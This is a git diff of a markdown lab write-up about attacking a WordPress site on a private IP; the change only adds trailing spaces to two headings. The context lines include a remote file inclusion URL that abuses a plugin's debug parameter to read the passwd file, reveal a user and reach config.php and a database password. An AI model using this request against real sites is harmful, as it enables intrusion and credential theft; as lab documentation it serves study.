@@ -38,10 +38,10 @@ Shows passwd file contents
 [http:// 192.168.55.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://localhost/payload.txt]    
 User Takis is revealed 
 ![image10](https://user-images.githubusercontent.com/66635295/158752455-4b285dee-5cd6-4449-a4f3-9d179e54d6a2.png)  
-**Config.php**
+**Config.php**  
 Word press config.php holds important info. The payload can be used to check for it  
 ![image9](https://user-images.githubusercontent.com/66635295/158752587-5af73a09-806d-4ada-bb96-16bcc3e5bd9e.png)
-**Visit Website**
+**Visit Website**  
 Viewing the source reveals a password for a SQL database  
 ![image11](https://user-images.githubusercontent.com/66635295/158753420-c9d6f360-973a-4eb9-b88d-afbf3f213196.png)
 
